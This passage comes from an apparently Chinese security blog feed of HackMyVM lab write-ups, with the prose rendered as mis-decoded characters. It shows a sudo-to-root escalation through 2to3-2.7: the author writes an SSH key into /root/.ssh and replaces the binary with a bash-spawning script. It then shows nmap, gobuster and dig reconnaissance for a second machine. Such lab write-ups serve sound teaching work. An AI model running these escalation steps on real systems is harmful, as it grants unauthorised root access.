</span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">000007d0:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">000007e0:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">000007f0:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000800:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000810:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000820:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000830:</span> <span class="number">0018 </span><span class="string">8af8</span> <span class="number">1765 </span><span class="string">703a</span> <span class="string">66dc</span> <span class="string">e967</span> <span class="string">bc00</span> <span class="number">0000</span>  <span class="string">.....ep:f..g....</span></span><br><span class="line"><span class="attr">00000840:</span> <span class="number">0049 </span><span class="string">454e</span> <span class="string">44ae</span> <span class="number">4260 </span><span class="number">82</span>                   <span class="string">.IEND.B`.</span></span><br><span class="line">                                                            </span><br><span class="line"><span class="string">â”Œâ”€â”€(rootã‰¿kakeru)-</span>[<span class="string">~/tmp</span>]</span><br><span class="line"><span class="string">â””â”€#</span> <span class="string">xxd</span> <span class="string">-r</span> <span class="string">tmp</span> <span class="string">&gt;</span> <span class="string">tmp.png</span></span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥å¾—åˆ°ä¸€ä¸ªpng<br>åœ¨æœ¬æœºæŸ¥çœ‹ä¹‹åå¾—åˆ°ç”¨æˆ·åå’Œå¯†ç <br><img src="https://pic1.imgdb.cn/item/67b9a490d0e0a243d40205b1.png"></p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">lover<span class="variable">@light</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> lover on <span class="symbol">light:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> lover may run the following commands on <span class="symbol">light:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/<span class="number">2</span>to3<span class="number">-2.7</span></span><br></pre></td></tr></table></figure></div>
<p>æœ‰ä¸€ä¸ªsudoæƒé™ï¼Œå‘ç°è¿™ä¸ªå‘½ä»¤æ˜¯ç”¨æ¥è½¬æ¢pythonæ–‡ä»¶çš„ è¾“å…¥â€“helpå¯ä»¥æŸ¥çœ‹å‚æ•°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">lover@light:~$ sudo /usr/bin/<span class="number">2</span>to3<span class="number">-2.7</span> <span class="comment">--help</span></span><br><span class="line">Usage: <span class="number">2</span>to3 [options] <span class="built_in">file</span>|dir ...</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, <span class="comment">--help            show this help message and exit</span></span><br><span class="line">  -d, <span class="comment">--doctests_only   Fix up doctests only</span></span><br><span class="line">  -f FIX, <span class="comment">--fix=FIX     Each FIX specifies a transformation; default: all</span></span><br><span class="line">  -j PROCESSES, <span class="comment">--processes=PROCESSES</span></span><br><span class="line">                        Run <span class="number">2</span>to3 concurrently</span><br><span class="line">  -x NOFIX, <span class="comment">--nofix=NOFIX</span></span><br><span class="line">                        Prevent <span class="keyword">a</span> transformation <span class="built_in">from</span> being run</span><br><span class="line">  -l, <span class="comment">--list-fixes      List available transformations</span></span><br><span class="line">  -p, <span class="comment">--print-function  Modify the grammar so that print() is a function</span></span><br><span class="line">  -v, <span class="comment">--verbose         More verbose logging</span></span><br><span class="line">  <span class="comment">--no-diffs            Don&#x27;t show diffs of the refactoring</span></span><br><span class="line">  -w, <span class="comment">--write           Write back modified files</span></span><br><span class="line">  -n, <span class="comment">--nobackups       Don&#x27;t write backups for modified files</span></span><br><span class="line">  -o OUTPUT_DIR, <span class="comment">--output-dir=OUTPUT_DIR</span></span><br><span class="line">                        Put output <span class="built_in">files</span> <span class="keyword">in</span> this <span class="built_in">directory</span> instead <span class="keyword">of</span></span><br><span class="line">                        overwriting <span class="keyword">the</span> input <span class="built_in">files</span>.  Requires -n.</span><br><span class="line">  -W, <span class="comment">--write-unchanged-files</span></span><br><span class="line">                        Also <span class="built_in">write</span> <span class="built_in">files</span> even <span class="keyword">if</span> no changes were required</span><br><span class="line">                        (useful <span class="keyword">with</span> <span class="comment">--output-dir); implies -w.</span></span><br><span class="line">  <span class="comment">--add-suffix=ADD_SUFFIX</span></span><br><span class="line">                        Append this <span class="keyword">string</span> <span class="built_in">to</span> all output filenames. Requires</span><br><span class="line">                        -n <span class="keyword">if</span> non-<span class="literal">empty</span>.  ex: <span class="comment">--add-suffix=&#x27;3&#x27; will generate</span></span><br><span class="line">                        .py3 <span class="built_in">files</span>.</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ‰ä¸€ä¸ª<code>-W</code>å‘½ä»¤å°±æœ‰å¾ˆå¤šæ–¹æ³•äº†ï¼Œè¿™æ˜¯å¯ä»¥å¼ºåˆ¶å†™å…¥æ–‡ä»¶çš„<br>ç¬¬ä¸€ç§æ–¹å¼ï¼Œå¯ä»¥å†™å…¥å…¬é’¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-<span class="selector-attr">[~/.ssh]</span></span><br><span class="line">â””â”€# cat id_ed25519<span class="selector-class">.pub</span></span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMwgCkwvKHNNuKBU4ICulTRkebSliiCn8+mnEiF5eBnI root<span class="keyword">@kakeru</span></span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMwgCkwvKHNNuKBU4ICulTRkebSliiCn8+mnEiF5eBnI root@kakeru</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print &quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œè¿™ä¹ˆå†™çš„æ„ä¹‰æ˜¯è®©ä¸‰ä¸ªå¼•å·è§£ææˆpythonçš„æ³¨é‡Šï¼Œç„¶åä¸‹é¢çš„print â€œâ€ æ˜¯python2çš„è¯­æ³•ï¼Œå¯ä»¥å‡ºå‘è½¬æ¢</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">lover@light:~$ nano authorized_keys </span><br><span class="line"></span><br><span class="line">lover@light:~$ sudo /usr/bin/<span class="number">2</span>to3-<span class="number">2.7</span> -o /root/.ssh/ -w -n authorized_keys </span><br><span class="line">lib2to3.main: Output <span class="keyword">in</span> <span class="comment">&#x27;/root/.ssh/&#x27; will mirror the input directory &#x27;&#x27; layout.</span></span><br><span class="line"><span class="symbol">RefactoringTool:</span> Skipping <span class="keyword">optional</span> fixer: buffer</span><br><span class="line"><span class="symbol">RefactoringTool:</span> Skipping <span class="keyword">optional</span> fixer: idioms</span><br><span class="line"><span class="symbol">RefactoringTool:</span> Skipping <span class="keyword">optional</span> fixer: set_literal</span><br><span class="line"><span class="symbol">RefactoringTool:</span> Skipping <span class="keyword">optional</span> fixer: ws_comma</span><br><span class="line"><span class="symbol">RefactoringTool:</span> Refactored authorized_keys</span><br><span class="line">--- authorized_keys	(original)</span><br><span class="line">+++ authorized_keys	(refactored)</span><br><span class="line">@@ -<span class="number">2</span>,<span class="number">4</span> +<span class="number">2</span>,<span class="number">4</span> @@</span><br><span class="line"> ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMwgCkwvKHNNuKBU4ICulTRkebSliiCn8+mnEiF5eBnI root@kakeru</span><br><span class="line"> <span class="comment">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">-print <span class="string">&quot;&quot;</span></span><br><span class="line">+print(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="symbol">RefactoringTool:</span> Writing converted authorized_keys <span class="keyword">to</span> /root/.ssh/authorized_keys.</span><br><span class="line"><span class="symbol">RefactoringTool:</span> Files that were modified:</span><br><span class="line"><span class="symbol">RefactoringTool:</span> authorized_keys</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œçš„-oå°±æ˜¯æŒ‡å®šè¾“å‡ºåˆ°çš„æ–‡ä»¶å¤¹ï¼Œè¿™æ ·æˆ‘ä»¬å°±æŠŠè‡ªå·±çš„ç§é’¥å†™å…¥&#x2F;root&#x2F;.sshé‡Œé¢äº†<br>ç„¶åæˆ‘ä»¬å°±å¯ä»¥ç”¨è‡ªå·±çš„ç§é’¥ç™»å½•äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/.ssh]</span><br><span class="line">â””â”€<span class="comment"># ssh root@192.168.112.81 -i id_ed25519                  </span></span><br><span class="line">Linux light <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">12</span>-amd64 <span class="comment">#1 SMP Debian 4.19.152-1 (2020-10-18) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> <span class="regexp">/usr/share/doc/</span>*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Fri Nov <span class="number">13</span> <span class="number">03</span>:<span class="number">40</span>:<span class="number">09</span> <span class="number">2020</span></span><br><span class="line">root@light:~<span class="comment"># </span></span><br></pre></td></tr></table></figure></div>

<p>ç¬¬äºŒç§æ–¹æ³•ï¼š å¼ºåˆ¶ä¿®æ”¹æ–‡ä»¶<br>è¿™é‡Œ&#x2F;usr&#x2F;bin&#x2F;2to3-2.7æ˜¯æœ‰sudoæƒé™çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¦‚æœèƒ½æŠŠè¿™é‡Œçš„æ–‡ä»¶å†…å®¹ä¿®æ”¹æˆè‡ªå·±æƒ³è¦çš„å†…å®¹ï¼Œé‚£ä¸æ˜¯å°±å¯ä»¥sudoäº†å—</p>
<p>æ€è·¯å°±æ˜¯æˆ‘ä»¬åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹é¢åˆ›å»ºä¸€ä¸ªåŒåæ–‡ä»¶ï¼Œç„¶åç»™æ‰§è¡Œæƒé™ï¼Œç”¨-Wå¼ºåˆ¶å†™å…¥<br>å…ˆçœ‹çœ‹åŸæ¥çš„å†…å®¹ï¼Œå°½é‡ä¿æŒä¸€è‡´</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">lover@light:~$ cat <span class="regexp">/usr/</span>bin/<span class="number">2</span>to3-<span class="number">2.7</span> </span><br><span class="line"><span class="comment">#! /usr/bin/python2.7</span></span><br><span class="line">import sys</span><br><span class="line">from lib2to3.main import main</span><br><span class="line"></span><br><span class="line">sys.<span class="keyword">exit</span>(main(<span class="string">&quot;lib2to3.fixes&quot;</span>))</span><br></pre></td></tr></table></figure></div>
<p>é‚£æˆ‘ä»¬å†™çš„æ—¶å€™ä¹Ÿè¦åŠ ä¸Šè¿™ä¸ªæ³¨é‡Š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">lover<span class="variable">@light</span><span class="symbol">:~</span><span class="variable">$ </span>touch  <span class="number">2</span>to3<span class="number">-2.7</span></span><br><span class="line">lover<span class="variable">@light</span><span class="symbol">:~</span><span class="variable">$ </span>nano <span class="number">2</span>to3<span class="number">-2.7</span> </span><br><span class="line">lover<span class="variable">@light</span><span class="symbol">:~</span><span class="variable">$ </span>chmod +x <span class="number">2</span>to3<span class="number">-2.7</span> </span><br><span class="line">lover<span class="variable">@light</span><span class="symbol">:~</span><span class="variable">$ </span>cat <span class="number">2</span>to3<span class="number">-2.7</span> </span><br><span class="line"><span class="comment">#! /usr/bin/python2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;/bin/bash&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åå†™å…¥åˆ°&#x2F;usr&#x2F;binç›®å½•ä¸‹é¢ï¼Œå¼ºåˆ¶æ›¿æ¢</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">lover</span>@light:~$ sudo /usr/bin/<span class="number">2</span>to3-<span class="number">2</span>.<span class="number">7</span>  -W -n -o /usr/bin <span class="number">2</span>to3-<span class="number">2</span>.<span class="number">7</span></span><br><span class="line"><span class="attribute">WARNING</span>: --write-unchanged-files/-W implies -w.</span><br><span class="line"><span class="attribute">lib2to3</span>.main: Output in &#x27;/usr/bin&#x27; will mirror the input directory &#x27;&#x27; layout.</span><br><span class="line"><span class="attribute">RefactoringTool</span>: Skipping optional fixer: buffer</span><br><span class="line"><span class="attribute">RefactoringTool</span>: Skipping optional fixer: idioms</span><br><span class="line"><span class="attribute">RefactoringTool</span>: Skipping optional fixer: set_literal</span><br><span class="line"><span class="attribute">RefactoringTool</span>: Skipping optional fixer: ws_comma</span><br><span class="line"><span class="attribute">RefactoringTool</span>: No changes to <span class="number">2</span>to3-<span class="number">2</span>.<span class="number">7</span></span><br><span class="line"><span class="attribute">RefactoringTool</span>: Writing converted <span class="number">2</span>to3-<span class="number">2</span>.<span class="number">7</span> to /usr/bin/<span class="number">2</span>to3-<span class="number">2</span>.<span class="number">7</span>.</span><br><span class="line"><span class="attribute">RefactoringTool</span>: Files that were modified:</span><br><span class="line"><span class="attribute">RefactoringTool</span>: <span class="number">2</span>to3-<span class="number">2</span>.<span class="number">7</span></span><br><span class="line"><span class="attribute">lover</span>@light:~$ sudo /usr/bin/<span class="number">2</span>to3-<span class="number">2</span>.<span class="number">7</span> </span><br><span class="line"><span class="attribute">root</span>@light:/home/lover# </span><br></pre></td></tr></table></figure></div>

<p>æœ€åè¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯pythonåº“åŠ«æŒï¼Œçœ‹è¿™ä¸ª2to3ç”¨åˆ°äº†ä»€ä¹ˆåº“ï¼Œç„¶åä¿®æ”¹è¿™ä¸ªåº“é‡Œé¢çš„æŸä¸ªå‡½æ•°ï¼Œè¿™é‡Œæˆ‘å°±ä¸å†™å‡ºæ¥äº†</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-webmaster</title>
    <url>/posts/49152.html</url>
    <content><![CDATA[<p>HMV-webmasteré¶æœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67a9618bd0e0a243d4fdc34e.png"></p>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.179.226</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">10</span> <span class="number">10</span>:<span class="number">36</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.226</span> (<span class="number">192.168</span>.<span class="number">179.226</span>)</span><br><span class="line">Host is up (<span class="number">0.0013</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">997</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">6</span>d:<span class="number">7</span>e:d2:d5:d0:<span class="number">45</span>:<span class="number">36</span>:d7:c9:ed:<span class="number">3</span>e:<span class="number">1</span>d:<span class="number">5</span>c:<span class="number">86</span>:fb:e4 (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">04</span>:<span class="number">9</span>d:<span class="number">9</span>a:de:af:<span class="number">31</span>:<span class="number">33</span>:<span class="number">1</span>c:<span class="number">7</span>c:<span class="number">24</span>:<span class="number">4</span>a:<span class="number">97</span>:<span class="number">38</span>:<span class="number">76</span>:f5:f7 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> b0:<span class="number">8</span>c:ed:ea:<span class="number">13</span>:<span class="number">0</span>f:<span class="number">03</span>:<span class="number">2</span>a:f3:<span class="number">60</span>:<span class="number">8</span>a:c3:ba:<span class="number">68</span>:<span class="number">4</span>a:be (ED25519)</span><br><span class="line"><span class="number">53</span><span class="symbol">/tcp</span> open  domain  Eero device dnsd</span><br><span class="line">| <span class="params">dns-nsid:</span> </span><br><span class="line">|_  bind.<span class="params">version:</span> not currently available</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="operator">/</span>html).</span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">MAC <span class="params">Address:</span> F2:B2:<span class="number">84</span>:<span class="number">58</span>:<span class="number">6</span>C:F6 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span></span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">Device:</span> WAP; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.29</span> ms <span class="number">192.168</span>.<span class="number">179.226</span> (<span class="number">192.168</span>.<span class="number">179.226</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">16.38</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæ¯”ä¸€èˆ¬çš„é¶æœºå¤šäº†ä¸€ä¸ª53ç«¯å£ï¼Œè¿™ä¸ªç«¯å£ä¸€èˆ¬æ˜¯ç”¨æ¥åšåŸŸåè§£æçš„ï¼Œæ‰€ä»¥å…ˆç•™ä¸ªå¿ƒçœ¼ï¼Œè¯´ä¸å®šå°±è¦ä¿®æ”¹hostsæ–‡ä»¶äº†</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.179.226                      </span><br><span class="line"> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;comic.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;comic&quot;</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--webmaster.hmv--&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>ç»™äº†å¼ å›¾ç‰‡å’Œä¸€ä¸ªæ³¨é‡Šã€‚å»æµè§ˆå™¨ä¸­æ‰“å¼€ä¹Ÿæ²¡æœ‰å…¶ä»–ä¿¡æ¯ï¼Œå¼€å§‹ç›®å½•æ‰«æ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">â””â”€# gobuster dir -u 192.168.179.226 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt </span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.179.226</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line"><span class="section">Progress: 207643 / 207644 (100.00%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="section">Finished</span></span><br><span class="line"><span class="section">===============================================================</span></span><br></pre></td></tr></table></figure></div>
<p>ç«Ÿç„¶ä»€ä¹ˆä¹Ÿæ²¡æœ‰<br>ç»“åˆåˆšæ‰æœ‰å¼€æ”¾çš„dnsæœåŠ¡å’Œç›´æ¥è®¿é—®webç»™çš„æ³¨é‡Šï¼Œæˆ‘æ€€ç–‘æ˜¯ä¸æ˜¯è¦æ”¹åŸŸåï¼Œæ‰€ä»¥ç¼–è¾‘ä¸€ä¸‹&#x2F;etc&#x2F;hostså†å»è®¿é—®ï¼Œä½†æ˜¯ç»“æœè¿˜æ˜¯ä¸€æ ·çš„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">â””â”€# vim /etc/hosts      </span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">â””â”€# curl <span class="number">192</span>.<span class="number">168</span>.<span class="number">179</span>.<span class="number">226</span></span><br><span class="line"> &lt;img src=<span class="string">&quot;comic.png&quot;</span> alt=<span class="string">&quot;comic&quot;</span>&gt; </span><br><span class="line">&lt;!--webmaster.hmv--&gt;</span><br><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">â””â”€# cat /etc/hosts                                   </span><br><span class="line"><span class="number">127.0.0.1</span>	localhost</span><br><span class="line"><span class="number">127.0.1.1</span>	kakeru.localdomain	kakeru</span><br><span class="line"><span class="number">192.168.240.113</span> dc-<span class="number">2</span></span><br><span class="line"><span class="number">192.168.179.226</span> webmaster.hmv webmaster</span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::<span class="number">1</span>     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::<span class="number">1</span> ip6-allnodes</span><br><span class="line">ff02::<span class="number">2</span> ip6-allrouters</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>æœ‰å…³äºdnsæœåŠ¡çš„å·¥å…·æˆ‘æƒ³åˆ°çš„åªæœ‰digäº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="code"><pre><span class="line">â””â”€# dig @192.168.179.226 webmaster.hmv</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.20.4-3-Debian &lt;&lt;&gt;&gt; @192.168.179.226 webmaster.hmv</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 38750</span><br><span class="line">;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1</span><br><span class="line">;; WARNING: recursion requested but not available</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">; COOKIE: f32eda80cb81fb45c347235f67a96b271532378304054959 (good)</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;webmaster.hmv.			IN	A</span><br><span class="line"></span><br><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">webmaster.hmv.		604800	IN	SOA	ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800</span><br><span class="line"></span><br><span class="line">;; Query time: 63 msec</span><br><span class="line">;; SERVER: 192.168.179.226#53(192.168.179.226) (UDP)</span><br><span class="line">;; WHEN: Mon Feb 10 10:57:43 CST 2025</span><br><span class="line">;; MSG SIZE  rcvd: 115</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# dig 192.168.179.226                                                          </span><br><span class="line">;; communications error to 192.168.179.180#53: timed out</span><br><span class="line">;; communications error to 192.168.179.180#53: timed out</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.20.4-3-Debian 